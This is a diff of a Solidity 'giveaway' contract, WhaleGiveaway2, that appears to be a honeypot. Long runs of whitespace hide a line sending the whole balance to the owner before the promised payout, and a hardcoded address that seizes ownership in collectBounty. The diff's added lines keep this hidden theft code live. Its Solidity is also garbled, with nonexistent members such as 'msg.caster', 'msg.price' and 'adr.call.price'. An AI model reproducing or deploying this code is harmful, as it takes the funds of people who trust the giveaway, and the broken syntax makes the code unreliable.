@@ -3,7 +3,7 @@ pragma solidity ^0.4.19;
 
 contract WhaleGiveaway2
 {
-    address public Owner = msg.caster;
+    address public Owner = msg.sender;
     uint constant public minimumEligibility = 0.999001 ether;
 
     function()
@@ -17,17 +17,17 @@ contract WhaleGiveaway2
     public
     payable
     {
-        if(msg.price>=minimumEligibility)
+        if(msg.value>=minimumEligibility)
         {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);
-            msg.caster.transfer(this.balance);
+            msg.sender.transfer(this.balance);
         }
     }
 
     function collectBounty()
     payable
     public
-    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.caster==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
-        require(msg.caster == Owner);
+    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
+        require(msg.sender == Owner);
         Owner.transfer(this.balance);
     }
 
@@ -35,7 +35,7 @@ contract WhaleGiveaway2
     payable
     public
     {
-        require(msg.caster == Owner);
-        adr.call.price(msg.price)(details);
+        require(msg.sender == Owner);
+        adr.call.price(msg.value)(details);
     }
 }
